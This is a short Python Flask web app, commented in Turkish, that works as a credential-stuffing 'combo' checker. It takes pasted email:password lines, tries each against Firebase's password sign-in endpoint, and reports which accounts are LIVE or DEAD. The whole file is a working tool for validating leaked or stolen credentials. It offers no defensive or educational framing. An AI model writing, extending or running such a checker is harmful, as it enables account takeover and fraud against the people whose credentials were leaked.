import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# GÜVENLİ YÖNTEM: Anahtarı kodun içine yazmıyoruz, Vercel ayarlarından çekiyoruz.
API_KEY = os.getenv("FIREBASE_API_KEY")

def check_account(email, password):
    if not API_KEY:
        return "CONFIG_ERROR"

    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    
    try:
        headers = {'Content-Type': 'application/json'}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if r.status_code == 200:
            return "LIVE"
        return "DEAD"
    except Exception as e:
        print(f"Hata: {e}")
        return "ERROR"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    stats = {"live": 0, "dead": 0, "checked": 0}

    for line in combos:
        if ":" in line:
            parts = line.split(":", 1)
            email, password = parts[0].strip(), parts[1].strip()
            status = check_account(email, password)
            
            stats["checked"] += 1
            if status == "LIVE":
                stats["live"] += 1
                results.append({"account": f"{email}:{password}", "status": "LIVE"})
            else:
                stats["dead"] += 1
                results.append({"account": f"{email}:{password}", "status": "DEAD"})
    
    return jsonify({"results": results, "stats": stats})

if __name__ == '__main__':
    app.run(debug=True)
